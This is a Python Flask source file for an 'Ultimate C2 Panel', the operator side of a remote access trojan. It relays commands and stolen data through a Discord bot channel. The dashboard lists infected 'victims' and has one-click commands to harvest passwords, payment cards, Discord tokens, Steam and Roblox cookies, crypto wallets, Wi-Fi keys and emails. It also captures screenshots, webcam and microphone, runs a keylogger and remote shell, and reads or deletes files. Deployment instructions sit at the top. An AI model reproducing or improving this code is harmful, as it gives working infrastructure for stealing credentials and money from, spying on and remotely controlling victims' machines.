# c2.py – Ultimate C2 Panel (stunning modern UI)
# Deploy on Render with env variables BOT_TOKEN, CHANNEL_ID

import os, time, json, threading, requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
if not BOT_TOKEN or not CHANNEL_ID:
    raise ValueError("Missing BOT_TOKEN or CHANNEL_ID")

DATA_FILE = "victims_data.json"
victims = {}
log_queues = {}
last_id = None

def load_data():
    global victims, log_queues
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                victims = data.get('victims', {})
                log_queues = data.get('log_queues', {})
                for vid in victims:
                    victims[vid]['last_seen'] = float(victims[vid]['last_seen'])
        except:
            pass

def save_data():
    data = {'victims': victims, 'log_queues': log_queues}
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

def fetch_loop():
    global last_id, victims, log_queues
    while True:
        try:
            url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages?limit=50"
            headers = {"Authorization": f"Bot {BOT_TOKEN}"}
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                msgs = resp.json()
                for msg in msgs:
                    mid = msg.get("id")
                    if last_id and mid == last_id:
                        break
                    content = msg.get("content", "")
                    if content.startswith("[") and "]" in content:
                        bracket = content.find("]")
                        victim_id = content[1:bracket]
                        rest = content[bracket+1:].strip()
                        if victim_id not in victims:
                            victims[victim_id] = {"last_seen": time.time(), "logs": []}
                        victims[victim_id]["last_seen"] = time.time()
                        if victim_id not in log_queues:
                            log_queues[victim_id] = []
                        log_queues[victim_id].append(rest)
                        if len(log_queues[victim_id]) > 200:
                            log_queues[victim_id] = log_queues[victim_id][-200:]
                        socketio.emit('new_log', {'victim': victim_id, 'log': rest})
                if msgs:
                    last_id = msgs[0]["id"]
        except:
            pass
        time.sleep(2)

threading.Thread(target=fetch_loop, daemon=True).start()

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/victims')
def api_victims():
    vlist = []
    for vid, data in victims.items():
        vlist.append({
            "id": vid,
            "last_seen": data["last_seen"],
            "online": (time.time() - data["last_seen"]) < 70
        })
    return jsonify(vlist)

@app.route('/api/logs/<victim_id>')
def api_logs(victim_id):
    return jsonify(log_queues.get(victim_id, []))

@app.route('/send', methods=['POST'])
def send_command():
    data = request.json
    victim_id = data.get('victim')
    command = data.get('command')
    if not command:
        return jsonify({'success': False, 'error': 'No command'})
    final = f"{command} @{victim_id}" if victim_id else command
    url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages"
    headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
    try:
        r = requests.post(url, headers=headers, json={"content": final}, timeout=10)
        if r.status_code == 200:
            return jsonify({'success': True})
        return jsonify({'success': False, 'error': f"HTTP {r.status_code}"})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>⚡ ULTIMATE C2 PANEL</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0c10; font-family: 'Inter', sans-serif; color: #eef2ff; padding: 24px; }
        .container { max-width: 1600px; margin: 0 auto; }
        /* Header */
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 32px; flex-wrap: wrap; gap: 16px; }
        h1 { font-size: 28px; font-weight: 700; background: linear-gradient(135deg, #ff6b6b, #ff8e53); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: -0.5px; }
        .badge { background: #1e1e2e; padding: 8px 16px; border-radius: 40px; font-size: 13px; border: 1px solid #2a2a3c; }
        /* Victims grid */
        .victims-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; margin-bottom: 32px; }
        .victim-card { background: #13161f; border-radius: 20px; padding: 20px; border: 1px solid #252a36; transition: all 0.2s; cursor: pointer; }
        .victim-card:hover { transform: translateY(-4px); border-color: #ff6b6b; box-shadow: 0 12px 24px -12px rgba(0,0,0,0.5); }
        .victim-card.active { border: 2px solid #ff6b6b; background: #181e2a; }
        .victim-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
        .victim-id { font-weight: 600; font-size: 15px; word-break: break-word; font-family: monospace; }
        .status { display: flex; align-items: center; gap: 8px; }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; }
        .online { background: #10b981; box-shadow: 0 0 6px #10b981; }
        .offline { background: #ef4444; }
        .status-text { font-size: 12px; font-weight: 500; }
        .last-seen { font-size: 11px; color: #6b7280; margin-top: 8px; }
        /* Main panel */
        .main-panel { display: flex; gap: 24px; flex-wrap: wrap; }
        .controls { flex: 1.2; min-width: 320px; background: #13161f; border-radius: 24px; padding: 24px; border: 1px solid #252a36; }
        .log { flex: 2; min-width: 400px; background: #13161f; border-radius: 24px; padding: 20px; height: 65vh; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 12px; }
        .current-victim { background: #1e2432; border-radius: 40px; padding: 8px 16px; display: inline-block; margin-bottom: 20px; font-size: 13px; font-weight: 500; }
        .button-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 24px 0; }
        button { background: #1e2432; border: none; color: #eef2ff; padding: 8px 16px; border-radius: 40px; cursor: pointer; transition: all 0.2s; font-size: 13px; font-weight: 500; display: inline-flex; align-items: center; gap: 6px; }
        button:hover { background: #ff6b6b; transform: scale(1.02); color: white; }
        .cmd-row { display: flex; gap: 12px; margin: 16px 0; }
        .cmd-row input { flex: 1; background: #1e2432; border: 1px solid #2a3242; border-radius: 40px; padding: 10px 16px; color: white; outline: none; font-size: 13px; }
        .cmd-row input:focus { border-color: #ff6b6b; }
        .log p { margin: 8px 0; border-left: 3px solid #ff6b6b; padding-left: 12px; word-break: break-word; line-height: 1.5; }
        .log pre { background: #0a0c10; padding: 10px; border-radius: 12px; overflow-x: auto; margin: 8px 0; font-size: 11px; }
        footer { text-align: center; margin-top: 40px; font-size: 12px; color: #4b5563; }
        @keyframes pulse { 0% { opacity: 0.6; } 100% { opacity: 1; } }
        .pulse { animation: pulse 1.5s infinite; }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #1e2432; border-radius: 10px; }
        ::-webkit-scrollbar-thumb { background: #ff6b6b; border-radius: 10px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>⚡ ULTIMATE C2 PANEL</h1>
        <div class="badge">🔗 Discord Relay | 🎯 Real‑time</div>
    </div>
    <div class="victims-grid" id="victimsGrid"></div>
    <div class="main-panel">
        <div class="controls">
            <div class="current-victim" id="currentVictim">⚠️ No victim selected</div>
            <div class="button-group">
                <button onclick="sendCmd('!info')">💻 Info</button>
                <button onclick="sendCmd('!ip')">🌐 IP</button>
                <button onclick="sendCmd('!clip')">📋 Clipboard</button>
                <button onclick="sendCmd('!active')">🪟 Active</button>
                <button onclick="sendCmd('!wifi')">📶 Wi-Fi</button>
                <button onclick="sendCmd('!tokens')">🎫 Discord</button>
                <button onclick="sendCmd('!passwords')">🔑 Passwords</button>
                <button onclick="sendCmd('!cards')">💳 Cards</button>
                <button onclick="sendCmd('!roblox')">🍪 Roblox</button>
                <button onclick="sendCmd('!steam')">🎮 Steam</button>
                <button onclick="sendCmd('!wallets')">💰 Wallets</button>
                <button onclick="sendCmd('!history')">📜 History</button>
                <button onclick="sendCmd('!emails')">📧 Emails</button>
                <button onclick="sendCmd('!screenshot')">📸 Screenshot</button>
                <button onclick="sendCmd('!webcam')">🎥 Webcam</button>
                <button onclick="sendCmd('!mic')">🎙️ Mic</button>
                <button onclick="sendCmd('!keylog_start')">⌨️ Keylog Start</button>
                <button onclick="sendCmd('!keylog_stop')">⏹️ Stop</button>
                <button onclick="sendCmd('!keylog_dump')">📄 Dump</button>
                <button onclick="sendCmd('!processes')">📊 Processes</button>
                <button onclick="sendCmd('!shell')">🐚 Shell Start</button>
                <button onclick="sendCmd('!shell_stop')">⏹️ Shell Stop</button>
                <button onclick="sendCmd('!lock')">🔒 Lock</button>
                <button onclick="sendCmd('!shutdown')">⏻ Shutdown</button>
                <button onclick="sendCmd('!restart')">⟳ Restart</button>
                <button onclick="sendCmd('!abort')">⚠️ Abort</button>
                <button onclick="sendCmd('!all')">⚠️ ALL DATA</button>
                <button onclick="sendCmd('!selfdestruct')" style="background:#8b0000;">💀 Self-Destruct</button>
                <button onclick="sendCmd('!exit')" style="background:#8b0000;">❌ Exit RAT</button>
            </div>
            <div class="cmd-row"><input id="customCmd" placeholder="!cmd dir or !shell command"><button onclick="sendCustom()">▶️ Run</button></div>
            <div class="cmd-row"><input id="catPath" placeholder="!cat path"><button onclick="sendCmd('!cat '+catPath.value)">Read</button></div>
            <div class="cmd-row"><input id="rmPath" placeholder="!rm path"><button onclick="sendCmd('!rm '+rmPath.value)">Delete</button></div>
            <div class="cmd-row"><input id="lsPath" placeholder="!ls path (default C:\\)"><button onclick="sendCmd('!ls '+lsPath.value)">List</button></div>
        </div>
        <div class="log" id="logPanel"></div>
    </div>
    <footer>⚡ All commands sent via Discord bot | Results appear here in real time</footer>
</div>
<script>
    const socket = io();
    let currentVictim = null;
    let victims = {};

    socket.on('new_log', (data) => {
        if (data.victim === currentVictim) addLog(data.log);
        refreshVictims();
    });

    function refreshVictims() {
        fetch('/api/victims').then(r=>r.json()).then(data => {
            victims = {};
            const grid = document.getElementById('victimsGrid');
            grid.innerHTML = '';
            data.forEach(v => {
                victims[v.id] = v;
                const card = document.createElement('div');
                card.className = `victim-card ${currentVictim === v.id ? 'active' : ''}`;
                card.innerHTML = `
                    <div class="victim-header">
                        <span class="victim-id">${v.id}</span>
                        <div class="status"><span class="status-dot ${v.online ? 'online' : 'offline'}"></span><span class="status-text">${v.online ? 'ONLINE' : 'OFFLINE'}</span></div>
                    </div>
                    <div class="last-seen">📅 Last seen: ${new Date(v.last_seen * 1000).toLocaleString()}</div>
                `;
                card.onclick = () => selectVictim(v.id);
                grid.appendChild(card);
            });
            if (currentVictim && victims[currentVictim]) {
                document.getElementById('currentVictim').innerHTML = `🎯 Controlling: ${currentVictim}`;
            } else if (data.length > 0 && !currentVictim) {
                selectVictim(data[0].id);
            } else if (!currentVictim) {
                document.getElementById('currentVictim').innerHTML = '⚠️ No victims online';
            }
        });
    }

    function selectVictim(victimId) {
        currentVictim = victimId;
        document.getElementById('currentVictim').innerHTML = `🎯 Controlling: ${victimId}`;
        fetch(`/api/logs/${victimId}`).then(r=>r.json()).then(logs => {
            const panel = document.getElementById('logPanel');
            panel.innerHTML = '';
            logs.forEach(log => addLog(log));
        });
        refreshVictims();
    }

    function addLog(msg) {
        const panel = document.getElementById('logPanel');
        const p = document.createElement('p');
        p.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        panel.appendChild(p);
        p.scrollIntoView();
    }

    function sendCmd(cmd) {
        if (!currentVictim) { alert('Select a victim first'); return; }
        fetch('/send', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({victim: currentVictim, command: cmd})
        }).then(r=>r.json()).then(data => {
            if (data.success) addLog(`> ${cmd} (sent)`);
            else addLog(`❌ Failed: ${data.error}`);
        });
    }

    function sendCustom() {
        let cmd = document.getElementById('customCmd').value.trim();
        if (cmd) sendCmd(cmd);
        document.getElementById('customCmd').value = '';
    }

    setInterval(refreshVictims, 5000);
    refreshVictims();
</script>
</body>
</html>
"""

if __name__ == '__main__':
    load_data()
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
